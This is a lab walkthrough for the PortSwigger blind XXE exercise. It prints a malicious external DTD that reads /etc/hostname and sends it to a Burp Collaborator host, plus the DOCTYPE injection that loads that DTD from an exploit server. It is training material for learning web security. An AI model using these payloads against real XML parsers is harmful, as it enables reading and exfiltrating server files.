## Lab Description: Exploiting blind XXE to exfiltrate data using a malicious external DTD

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/40250466-3829-44f4-9fae-2a861b33d9ca)


## Solution: 

Create a malicious DTD -

On the exploit server create a malicious DTD file with the following contents,
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
Host this malicious.dtd file in our exploit server.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/90d56efc-7d4d-45fd-a56b-145a85f27b84)

Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/479160d9-bdaa-4371-bbc5-75bbaf5ba2e2)

You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/fa03b73d-11d3-47e8-bbac-aa01082df5c7)

Insert the following external entity definition in between the XML declaration and the stockCheck element:
```
<!DOCTYPE stockchange [<!ENTITY % xxe SYSTEM "https://exploit-0af600e504347448810aa67d019700e4.exploit-server.net/exploit"> %xxe;]>
```

Here We have to post our exploit server url which will execute the DTD 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/7305e724-4d12-4091-bee1-f90d2e414297)

Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/0484cc41-5480-4851-bc94-45ac75bede43)

You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/91b48b0c-4e2e-4b77-bed0-74a337d375de)

Lab Solved

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/83bb45c6-5aec-419d-8702-e54320c5d1df)



